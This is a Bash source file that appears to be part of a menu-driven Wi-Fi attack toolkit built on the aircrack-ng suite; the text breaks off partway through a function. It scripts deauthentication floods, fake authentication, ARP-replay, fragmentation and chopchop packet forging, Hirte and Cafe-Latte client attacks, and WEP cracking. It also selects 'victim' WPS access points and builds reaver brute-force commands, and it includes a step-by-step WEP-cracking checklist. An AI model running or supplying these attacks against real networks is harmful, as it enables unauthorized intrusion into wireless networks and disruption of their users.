wifi_101--()
{
trap trap-- INT

##~~~~~~~~~~~~~~~~~~ BEGIN wifi_101-- Repitious Functions ~~~~~~~~~~~~~~~~~~~~~##
	cfile--()
	{
	cf= ## capture file name
	while [[ -z $cf ]];do
		echo -e "$inp\nCapture File Name?"
		read cf
	done

	case $parent_IV in
		dump) dump--;;
	esac

	case $parent_V in
		crack) crack--;;
	esac

	## cfile_III--() should replace this eventually
	case $parent_VI in
		ctech) parent_VI= ## Nulled to prevent repeat looping that is NOT wanted!
		Eterm -b black -f white --pause --title "Shared-Key PRGA Capture" -e airbase-ng $pii -c $tc -e "$e" -s -W 1 -F $cf &
		sleep 2;;
	esac
	}

	st_1--()
	{
	kill -9 $wifi_ias_pid
	kill -9 $wifi_dea_pid
	clear
	}

	wpa_warn--()
	{
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$wrn

**********************************************************
             .....BEFORE PROCEEDING.....
                  ...MAKE SURE...

  IF YOU ELECTED TO DO THE PRELIMINARY AIRODUMP-NG SCAN
YOU HAVE KILLED OFF THE ORIGINAL AIRODUMP-NG ETERM SESSION

..........UNDESIRED RESULTS MAY OCCUR OTHERWISE...........
**********************************************************$ins

            ****PRESS ENTER TO CONTINUE****$hdr

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read
	sleep .7
	}
##~~~~~~~~~~~~~~~~~~~~ END wifi_101-- Repitious Functions ~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~ BEGIN Starting wifi_101-- Function ~~~~~~~~~~~~~~~~~~~~~##
	venue--()
	{
	parent=
	parent_VII=
	chan_res=$(iwlist $pii channel | grep Current | awk '{print $5}' | sed 's/)//')
	tc=$chan_res
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            --WiFi 101 Venue Selection--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1)  Scan Channels

2)  Airodump-ng Capture

3)  De-Authentications

4)  Fake Authentications

5)  Router-Based WEP Attacks

6)  Packet Forging

7)  Forged Packet Injection

8)  Client-Based WEP Attacks

9)  Crack WEP .pcap

10) Client-Based WPA Attacks

11) WACg-Style WPS Attack

L)ist the Steps needed to Crack WEP

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1|2|3|4|5|6|7|8|10|11) if [[ -z $pii ]];then
			dev_parent="venue--"
			no_dev-- monitor
		fi;;

	esac

	case $var in
		1) sc=1-11 ## Channels to scan on
		hop=1500 ## time between channel hops
		wifi_scan--;;

		2) b= ## tgt bssid
		tc= ## Nulled
		cf=
		of="pcap" ## Output Format for Airodump-NG
		parent="venue"
		dump--;;

		3) wifi_deauth--;;

		4) 	ska_xor= ## Variable for file used w/ SKA injection
		hid_essid= ## Variable for hidden ESSID
		rd=10 ## reauthentication delay
		ppb=1 ## Re-authentication packets per burst
		kaf=3 ## keep-alive frequency
		parent="venue"
		auth--;;

		5) parent="venue"
		rtech--;;

		6) parent="venue"
		pforge--;;

		7) parent="venue"
		rppb=500
		forge_out--;;

		8) parent="venue"
		ctech--;;

		9) parent="venue"
		crack--;;

		10) parent_VII="WPA"
		WPA--;;

		11) wacg--;;

		l|L) lists--;;

		m|M) main_menu--;;

		*) venue--;;
	esac
	}
##~~~~~~~~~~~~~~~~~~~~~ END Starting wifi_101-- Function ~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~ BEGIN wifi_101-- venue-- functions ~~~~~~~~~~~~~~~~~~~~~~##
	wifi_scan--()
	{
	#wifi_ias_pid= ##PID for initial Airodump-NG scan
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            --Channel Scanning Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Specified Channels [$out$sc$inp]

2) Hop Frequency (ms) [$out$hop$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) echo -e "$inp\nSpecified Channel(s)?\n(ie.. 1) (ie.. 1,2,3) (ie.. 1-14)"
		read sc
		wifi_scan--;;

		2) echo -e "$inp\nHop Frequency in milliseconds?"
		read hop
		wifi_scan--;;

		c|C) if [[ -z $sc || -z $hop ]];then
			echo -e "$wrn\nYou Must Enter the Channels and Hop to Proceed"
			read
			wifi_scan--
		fi;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) wifi_scan--;;
	esac

	Eterm -b black -f white --pause --title "Channel Scan: $sc" -e airodump-ng -f $hop $pii --channel $sc & wifi_ias_pid=$!
	venue--
	}

	dump--()
	{
	parent_IV=
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        --Capture Session Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Tgt Channel      [$out$tc$inp]

2) BSSID {Optional} [$out$b$inp]

3) File Name        [$out$cf$inp]

4) Output Format    [$out$of$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) parent_IV="dump"
		tchan--;;

		2) echo -e "$inp\nTgt BSSID? (Leave Blank to Null)"
		read b
		dump--;;

		3) parent_IV="dump"
		cfile--;;

		4) of=
		while [[ -z $of ]];do
			echo -e "$inp\nOutput Format? (pcap, ivs, csv, gps, kismet, netxml)"
			read of
			case $of in
				pcap|ivs|csv|gps|kismet|netxml) ;;
				*) of= ;;
			esac

		done

		dump--;;

		c|C) if [[ -z $tc || -z $cf || -z $of ]];then
			echo -e "$wrn\nTgt Channel & File Name & Output-Format Must be Filled Before Proceeding"
			sleep 1
			dump--
		fi;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) dump--;;
	esac

	kill -9 $wifi_ias_pid
	kill -9 $wifi_dea_pid
	if [[ -z $b ]];then
		Eterm -b black -f white --pause --title "AiroDump Channel: $tc File: $cf Format: $of" -e airodump-ng $pii --channel $tc -w $cf --output-format $of &
	else
		Eterm -b black -f white --pause --title "AiroDump Channel: $tc File: $cf BSSID: $b Format: $of" -e airodump-ng $pii --channel $tc --bssid $b -w $cf --output-format $of &
	fi

	venue--
	}

	wifi_deauth--()
	{
	sc= ## Wireless channel to deauth on
	rb= ## Router BSSID
	#wifi_dea_pid= ## Deauth Scan PID

		wifi_deauth_II--()
		{
		dt= ## DeAuth Type
		cm= ## Client MAC

			wifi_switch_deauth--()
			{
			kill -9 $wifi_dea_pid
			sc=
			while [[ -z $sc ]];do
				echo -e "$inp\nSpecified Channel(s)?\n(ie.. 1) (ie.. 1,2,3) (ie.. 1-14)"
				read sc
			done

			hop=
			while [[ -z $hop ]];do
				echo -e "$inp\nMilliseconds between channel hops?"
				read hop
			done

			Eterm -b black -f white --pause --title "Channel Scan: $sc" -e airodump-ng -f $hop $pii --channel $sc & wifi_ias_pid=$!
			sleep .7
			wifi_deauth--
			}

			wifi_deauth_III--()
			{
			r_d= ## Repeat DeAuth Variable
			while [[ -z $r_d ]];do
				clear
				echo -e "$inp\n(R)epeat DeAuth\n(C)hange or Add Client for DeAuth\n(S)witch Channel or Change Router BSSID\n(E)xit DeAuth"
				read r_d
			done

			case $r_d in
				r|R) case $dt in
					b|B) echo -e "$out"
					aireplay-ng $pii -0 3 -a $rb
					wifi_deauth_III--;;

					c|C) echo -e "$out"
					aireplay-ng $pii -0 3 -a $rb -c $cm
					wifi_deauth_III--;;
				esac;;

				c|C) clear
				wifi_deauth_II--;;

				s|S) wifi_switch_deauth--;;

				e|E) venue--;;

				*) wifi_deauth_III--;;
			esac
			}

		while [[ -z $dt ]];do
			clear
			echo -e "$inp\n(B)roadcast Deauth\n(C)lient Targeted DeAuth\n(S)witch Channel or Change Router BSSID\n(E)xit DeAuth"
			read dt
		done

		case $dt in
			b|B) echo -e "$out"
			aireplay-ng $pii -0 4 -a $rb
			wifi_deauth_III--;;

			c|C) while [[ -z $cm ]];do
				echo -e "$inp\nClient MAC address?"
				read cm
			done

			echo -e "$out"
			aireplay-ng $pii -0 4 -a $rb -c $cm
			wifi_deauth_III--;;

			s|S) wifi_switch_deauth--;;

			e|E) venue--;;

			*) wifi_deauth_II--;;
		esac
		}

	clear

	chan_check-- $pii
	if [[ -n $chan_res ]];then
		echo -e "$out\nCurrent Channel is: $chan_res. $inp Would You Like to Change it? (y/n)"
		read var
		case $var in
			y|Y) tchan--;;
			n|N) tc=$chan_res ;;
			*) venue--;;
		esac

	else
		tchan--
	fi

	if [[ -z $tc ]];then
		venue--
	fi

	sc=$tc

	echo -e "$inp\nRouter BSSID?"
	read rb
	if [[ -z $rb ]];then
		venue--
	fi

	kill -9 $wifi_ias_pid
	kill -9 $wifi_dea_pid
	Eterm -b black -f white --pause --title "Channel Scan: $sc" -e airodump-ng $pii --channel $sc --bssid $rb & wifi_dea_pid=$!
	sleep .7
	wifi_deauth_II--
	clear
	}

	auth--()
	{
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                          --Fake Authentication Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Tgt Channel                                            [$out$tc$inp]

2) BSSID                                                  [$out$b$inp]

3) Source MAC                                             [$out$sm$inp]

4) Re-Authentication Packets per Burst                    [$out$ppb$inp]

5) Re-Authentication Delay in Seconds                     [$out$rd$inp]

6) Keep-Alive Frequency in Seconds                        [$out$kaf$inp]

7) ESSID {Optional, Must be Used if ESSID is Hidden}      [$out$hid_essid$inp]

8) SKA .xor Injection {Optional}                          [$out$ska_xor$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) chan_check-- $pii
		if [[ -n $chan_res ]];then
			echo -e "$out\nCurrent Channel is: $chan_res.$inp  Would You Like to Change it? (y/n)"
			read var
			case $var in
				y|Y) tchan--;;
				n|N) tc=$chan_res ;;
				*) auth--;;
			esac

		else
			tchan--
		fi

		if [[ -z $tc ]];then
			auth--
		else
			iwconfig $pii channel $tc
			auth--
		fi;;

		2) echo -e "$inp\nTgt BSSID?"
		read b
		auth--;;

		3) echo -e "$inp\nSource MAC?"
		read sm
		auth--;;

		4) ppb=
		while [[ -z $ppb ]];do
			echo -e "$inp\nRe-Authentication Packets per Burst? (1=Single 0=Multiple)"
			read ppb
			case $ppb in
				1|0) ;;
				*) ppb= ;;
			esac

		done

		auth--;;

		5) echo -e "$inp\nRe-Authentication Delay in Seconds?"
		read rd
		auth--;;

		6) echo -e "$inp\nKeep-Alive Frequency in Seconds?"
		read kaf
		auth--;;

		7) echo -e "$inp\nEnter Hidden ESSID (Leave Blank to Null)"
		read hid_essid
		auth--;;

		8) echo -e "$inp\n.xor file? (Leave Blank to Null)"
		read ska_xor
		auth--;;

		c|C) if [[ -z $tc || -z $b || -z $sm || -z $ppb || -z $rd || -z $kaf ]];then
			echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
			sleep 1
			auth--
		fi;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) auth--;;
	esac

	if [[ -z $hid_essid && -z $ska_xor ]];then
		Eterm -b black -f white --pause --title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm &
	elif [[ -z $ska_xor ]];then
		Eterm -b black -f white --pause --title "Fake Auth Hidden ESSID" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -e "$hid_essid" &
	elif [[ -z $hid_essid ]];then
		Eterm -b black -f white --pause --title "Fake Auth w/SKA .xor" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -y $ska_xor &
	else
		Eterm -b black -f white --pause --title "Fake Auth Hidden ESSID w/SKA .xor" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -y $ska_xor -e "$hid_essid" &
	fi

	venue--
	}

	rtech--()
	{
	#rt= ## Router Technique
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~
Router Technique Selection
~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Fragmentation Attack

2) Chop Attack

3) ARP Replay Attack

4) Broadcast Attack

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read rt
	case $rt in
		1|2|3|4) rppb=500 ## Replayed packets per burst
		case $rt in
			1|2) parent_II="fragchop";;
			3|4) parent_II="broadarp";;
		esac

		e=
		rtech_II--;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) rtech--;;
	esac
	}

	pforge--()
	{
	nowdate=$(date +%M%S) ## Timestamp for files
	pf_var= ## variable name for -w filename

		pforge_S--()
		{
		clear
		echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      --Simple Packet Forging Options--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Tgt BSSID      [$out$b$inp]

2) Source MAC     [$out$sm$inp]

3) .xor filename  [$out$xor$inp]

C)ontinue

P)revious Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
		read var
		case $var in
			1) echo -e "$inp\nTgt BSSID?"
			read b
			pforge_S--;;

			2) echo -e "$inp\nSource MAC?"
			read sm
			pforge_S--;;

			3) echo -e "$inp\n.xor filename?"
			read xor
			pforge_S--;;

			c|C) if [[ -z $b || -z $sm || -z $xor ]];then
				echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
				sleep 1
				pforge_S--
			fi;;

			p|P) pforge--;;

			*) pforge_S--;;
		esac
		}

		pforge_A--()
		{
		clear
		echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     --Advanced Packet Forging Options--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Tgt BSSID      [$out$b$inp]

2) Source MAC     [$out$sm$inp]

3) .xor filename  [$out$xor$inp]

4) Source IP      [$out$src_ip$inp]

5) Destination IP [$out$dst_ip$inp]

C)ontinue

P)revious Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
		read var
		case $var in
			1) echo -e "$inp\nTgt BSSID?"
			read b
			pforge_A--;;

			2) echo -e "$inp\nSource MAC?"
			read sm
			pforge_A--;;

			3) echo -e "$inp\n.xor filename?"
			read xor
			pforge_A--;;

			4) echo -e "$inp\nSource IP?"
			read src_ip
			ip_mac-- ip $src_ip
			if [[ $ip_mac == "fail" ]];then
				src_ip=
			fi

			pforge_A--;;

			5)echo -e "$inp\nDestination IP?"
			read dst_ip
			ip_mac-- ip $dst_ip
			if [[ $ip_mac == "fail" ]];then
				dst_ip=
			fi

			pforge_A--;;

			c|C) if [[ -z $xor || -z $src_ip || -z $dst_ip ]];then
				echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
				sleep 1
				pforge_A--
			fi;;

			p|P) pforge--;;

			*) pforge_A--;;
		esac
		}

	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   --Packet Forging Mode--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Simple Mode {Recommended}

2) Advanced Mode

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) p_mode="simple" ;;
		2) p_mode="advanced" ;;
		p|P) p_mode="venue" ;;
		m|M) p_mode="main" ;;
	esac

	case $p_mode in
		simple) pforge_S--;;
		advanced) pforge_A--;;
	esac

	echo -e "$out"
	case $p_mode in
		simple) packetforge-ng -0 -a $b -h $sm -k 255.255.255.255 -l 255.255.255.255 -y $xor -w $nowdate\arp-request ;;
		advanced) packetforge-ng -0 -a $b -h $sm -k $dst_ip -l $src_ip -y $xor -w arp-request ;;
	esac

	case $p_mode in
		simple|advanced) while [[ -z $pf_var ]];do
			echo -e "$inp\nWhat was the name of the file just created?"
			read pf_var
		done

		venue--;;

		venue) venue--;;

		main) main_menu--;;
	esac
	}

	forge_out--()
	{
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
           --Forged Packet Injection Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Replayed Packets per Burst [$out$rppb$inp]

2) Packetforge-NG Filename    [$out$pf_var$inp]

3) Source MAC                 [$out$sm$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) echo -e "$inp\nReplayed Packets per Burst?"
		read rppb
		if [[ $rppb -gt 1000 ]];then
			rppb=1000
		elif [[ $rppb -lt 1 ]];then
			rppb=1
		fi
		forge_out--;;

		2) echo -e "$inp\nPacketforce-NG Filename?"
		read pf_var
		forge_out--;;

		3) echo -e "$inp\nSource MAC?"
		read sm
		forge_out--;;

		c|C) if [[ -z $rppb || -z $pf_var || -z $sm ]];then
			echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
			sleep 1
			forge_out--
		fi;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) forge_out--;;
	esac


	Eterm -b black -f white --pause --title "Forged Packet Attack" -e aireplay-ng $pii -2 -r $pf_var -x $rppb -h $sm &
	venue--
	}

	ctech--()
	{
	#ct= ## Client technique
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~
Client Technique Selection
~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Hirte (AP)

2) Hirte (Ad-Hoc)

3) Cafe-Latte

4) Shared-Key PRGA Capture

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read ct
	case $ct in
		1|2|3|4) ctech_II--;;
		p|P) venue--;;
		m|M) main_menu--;;
		*) ctech--;;
	esac
	}

	crack--()
	{
	clear
	parent_V= ## Nulled to prevent repeat looping that is NOT wanted!
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
           --WEP Crack Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Tgt BSSID   [$out$b$inp]

2) File Name   [$out$cf$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) echo -e "$inp\nTgt BSSID?"
		read b
		crack--;;

		2) parent_V="crack"
		cfile--;;

		c|C) if [[ -z $b || -z $cf ]];then
			echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
			sleep 1
			crack--
		else
			Eterm -b black -f white --pause --title "WEP Crackin BSSID: $b File: $cf" -e aircrack-ng -a 1 -b $b $cf* &
			crack--
		fi;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) crack--;;
	esac
	}

	WPA--()
	{
	#wifu= ## WPA Client Attack Method
	e= ## Desired ESSID
	#enc_type= ## Encryption Type
	#spec= ## Variable for WPA_II()
	all_probe= ## Respond to all probes
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
          --WPA Client Attack Techniques--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) WPA (Specified ESSID)

2) WPA2 (Specified ESSID)

3) All Tags (Specified ESSID)

4) WPA (Responding to All Broadcast Probes)

5) WPA2 (Responding to All Broadcast Probes)

6) All Tags (Responding to All Broadcast Probes)

7) d'Otreppe WPA (Specified ESSID)

8) d'Otreppe WPA2 (Specified ESSID)

9) d'Otreppe All Tags (Specified ESSID)

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read wifu
	case $wifu in
		1|4|7) enc_type='-z 2';;
		2|5|8) enc_type='-Z 4';;
		3|6|9) enc_type='-0';;
		p|P) venue--;;
		m|M) main_menu--;;
		*) WPA--;;
	esac

	case $wifu in
		1|2|3|7|8|9) spec="1"
		while [[ -z $e ]];do
			echo -e "$inp\nDefine ESSID"
			read e
		done;;

		4|5|6) spec=2
		all_probe='-P -C 60';;
	esac

	chan_check-- $pii
	if [[ -n $chan_res ]];then
		echo -e "$out\nCurrent Channel is: $chan_res.$inp  Would You Like to Change it? (y/n)"
		read var
	else
		tchan--
	fi

	case $var in
		y|Y) tchan--;;
		n|N) tc=$chan_res ;;
		*) WPA--;;
	esac

	if [[ -z $tc ]];then
		WPA--
	fi

	WPA_II--
	}

	wacg--()
	{
	pidfile="/tmp/WACg/airo.pid"
	capture="airodump-ng -w /tmp/WACg/capture $pii --output-format csv,netxml"
	my_mac=$(macchanger -s $pii |cut -d" " -f3)

		countdown--()
		{
		IFS=:
		set -- $*
		secs=$(( ${1#0} ))
		while [ $secs -gt 0 ]; do
			sleep 1 &
			printf "\r[*] Time remaining - %02d:%02d:%02d" $((secs/3600)) $(( (secs/60)%60)) $((secs%60))
			secs=$(( $secs - 1 ))
			wait
		done
		}

		wacg_scan--()
		{
		shred -u /tmp/WACg/* > /dev/null 2>&1
		rm -r /tmp/WACg >/dev/null 2>&1
		mkdir /tmp/WACg > /dev/null 2>&1
		$capture &>/dev/null &
		PID=$!
		echo $PID > "$pidfile" &
		echo -e "$out"
		countdown-- "$cnt_time" & sleep $cnt_time && echo -e "$out\n[>] Done!!\n" &&

		for pidkill in $(cat $pidfile); do
			(kill -9 $pidkill 2>/dev/null) &    # Dirty but supresses kill output
			wait $pidkill 2>/dev/null           #
		done

		## Split up capture and clean up
		## AP Fields: BSSID,channel,Privacy,Cipher,beacons,IV,ESSID
		## Client Fields: Station MAC,Power,packets,BSSID,Probed ESSIDs
		## Add flags to AP's for Clients and WPS
		cat /tmp/WACg/capture-01.csv | tr -d " " | grep -a WPA | cut -d"," -f 1,4,6-7,10-11,14 | sed 's/$/,/' >> /tmp/WACg/AP-WPA.txt
		#Associated Client List
		cat /tmp/WACg/capture-01.kismet.netxml | grep "<client-mac>" | cut -d">" -f2 | cut -d"<" -f1 >> /tmp/WACg/client-tmp.txt
		for client in $(cat /tmp/WACg/client-tmp.txt); do
			(cat /tmp/WACg/capture-01.csv |grep -a $client >> /tmp/WACg/clients-tmp.txt) > /dev/null 2>&1
		done

		(cat /tmp/WACg/clients-tmp.txt |tr -d " " |cut -d"," -f1,4-7 >> /tmp/WACg/clients.txt) > /dev/null 2>&1
		## Set client flag for AP's (Y/N)
		for cliY in $(cat /tmp/WACg/clients.txt |cut -d"," -f4 |uniq); do
			sed -i "/^$cliY/ s/\$/Yes/" /tmp/WACg/AP-WPA.txt
		done

		for cliN in $(cat /tmp/WACg/AP-*.txt |cut -d"," -f1-8 |egrep -a -v "Yes" |cut -d"," -f1); do
			sed -i "/^$cliN/ s/\$/No /" /tmp/WACg/AP-WPA.txt
		done

		## Set WPA WPS flag for reaver (Y/N)
		wash -f /tmp/WACg/capture-*.cap -C >> /tmp/WACg/wps_tmp.txt >/dev/null 2>&1
		cat /tmp/WACg/wps_tmp.txt |grep ":" |tr ' ' ',' |sed 's/,,,,,,/,/g' |sed 's/,,,,,,/,/g' |sed 's/,,/,/g' |sed 's/,,/,/g' |sed 's/,,/,/g' >> /tmp/WACg/wps.txt
		sed -i 's/$/,/' /tmp/WACg/AP-WPA.txt
		for wpsY in $(cat /tmp/WACg/wps.txt |cut -d"," -f1); do
			sed -i "/^$wpsY/ s/\$/Yes/" /tmp/WACg/AP-WPA.txt
		done

		for wpsN in $(cat /tmp/WACg/AP-WPA.txt |cut -d"," -f1-7,9 |egrep -a -v "Yes" |cut -d"," -f1); do
			sed -i "/^$wpsN/ s/\$/No /" /tmp/WACg/AP-WPA.txt
		done

		wacg_check="active"
		## Display Networks
		echo -e "$out\nAvailable WPA-Networks:$ins\n[If ESSID is empty the network is hidden!]\n$out"
		cat /tmp/WACg/AP-WPA.txt |awk -F, '{print "BSSID: " $1 "\tChannel: " $2 "\tClients: " $8  "\tWPS: " $9 "\tESSID: " $7}'
		wacg_II--
		}

		wacg_II--()
		{
		var_II=
		while [[ -z $var_II ]];do
			echo -e "$inp\n\n\n(C)ontinue, (R)escan, or (P)revious Menu?"
			read var
			case $var in
				c|C)var_II=1 ;;

				p|P) venue--;;

				r|R)var_II=1
				clear
				wacg_scan--;;
			esac

		done

		echo -e "$inp\n[>] Select victim AP MAC address"
		echo -n "MAC: "
		read -e vic_mac
		vic_chan=$(grep -a $vic_mac /tmp/WACg/AP-*.txt |cut -d"," -f2)
		echo -e "$inp\n[>] Use (R)eaver or (A)ireplay-ng to associate with the target"
		read -e wacg_asc
		case $wacg_asc in
			r|R) clear
			echo -e "$ins\nreaver -i $pii --delay=0 --dh-small --lock-delay=250 --fail-wait=250 --eap-terminate -v -c $vic_chan -b $vic_mac\n\n\n$hdr"
			read -p "[>] Return to Main Menu press [Enter]..." readEnterKey
			venue--;;

			a|A) clear
			echo -e "$ins\niwconfig $pii $vic_chan"
			echo "aireplay-ng -1 4 -o 1 -q 2 -a $vic_mac -h $my_mac $pii"
			echo "reaver -i $pii --delay=0 --dh-small --lock-delay=250 --fail-wait=250 --eap-terminate -v -A -b $vic_mac"
			echo -e "\n\n$hdr"
			read -p "[>] Return to Main Menu press [Enter]..." readEnterKey
			venue--;;
		esac
		}

	clear
	var=
	while [[ -z $var ]];do
		echo -e "$inp\nAiroDump-NG Scanning Time?"
		read cnt_time
		if [[ -z $cnt_time ]];then
			cnt_time=10
			var=1
		fi

		if [ $cnt_time -eq $cnt_time > /dev/null 2>&1 ];then
			var=1
		fi

	done

	wacg_scan--
# 	wacg_II--
	}

	lists--()
	{
	clear
	echo -e "$ins
SM - Desired Source MAC
AP - Access Point

Activate capture file on desired channel/bssid

Use aireplay-ng to do a fake authentication with the access point [-1 6000 -q 5 -a "AP" -h "SM"]

Fake SKA Authentication
	a. Deauthenticate a connected client to grab a xor
	b. Authenticate via the xor [-1 6000 -q 5 -a "AP" -h "SM" -y "xor"]
	c. Fragment the xor against the AP to create a new xor [-5 -b "AP" -h "SM"]
	d. Packetforge the new xor [-0 -a "AP" -h "SM" -k {dest} "255.255.255.255" -l {src} "255.255.255.255" -y "new_xor" -w "arp_request"]
	e. Replay the forged arp_request packet against the AP [-2 -b "AP" -h "SM" -y "arp_request"]

If using standard ARP replays or Broadcast attacks, then:
	a. Run aircrack-ng to crack key using the IVs collected

If using chopchop or a fragmentation attack, then:
	a. Obtain the PRGA .xor
	b. Packetforge the .xor [-0 -a "AP" -h "SM" -k {dest} "255.255.255.255" -l {src} "255.255.255.255" -y "new_xor" -w "arp_request"]
	c. Replay the forged arp_request packet against the AP [-2 -b "AP" -h "SM" -y "arp_request"]
	d. Run aircrack-ng to crack key using the IVs collected

For ARP amplification run a chopchop attack and decrypt the .cap file it creates:
	a. tcpdump -s 0 -n -e -r chopchop.cap
	b. Packetforge the .xor [-0 -a "AP" -h "SM" -k {dest} -l {src} -y "new_xor" -w "arp_request"]"
	read
	venue--
	}
##~~~~~~~~~~~~~~~~~~~~ END wifi_101-- venue-- functions ~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~ BEGIN wifi_101-- rtech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~##
	rtech_II--()
	{
	clear
	case $parent_II in
		fragchop) echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      --Attack Generation Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Tgt Channel      [$out$tc$inp]

2) Source MAC       [$out$sm$inp]

3) Tgt BSSID        [$out$b$inp]

4) ESSID {Optional} [$out$e$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
		read var
		case $var in
			1) parent_III="rtech"
			tchan--;;

			2) echo -e "$inp\nSource MAC?"
			read sm
			rtech_II--;;

			3) echo -e "$inp\nTgt BSSID?"
			read b
			rtech_II--;;

			4) echo -e "$inp\nTgt ESSID? (Leave Blank to Null)"
			read e
			rtech_II--;;

			c|C) if [[ -z $tc || -z $sm || -z $b ]];then
				echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
				sleep 1
				rtech_II--
			fi;;

			p|P) rtech--;;

			m|M) main_menu--;;

			*) rtech_II--;;
		esac;;

		broadarp) echo -e "$hdr
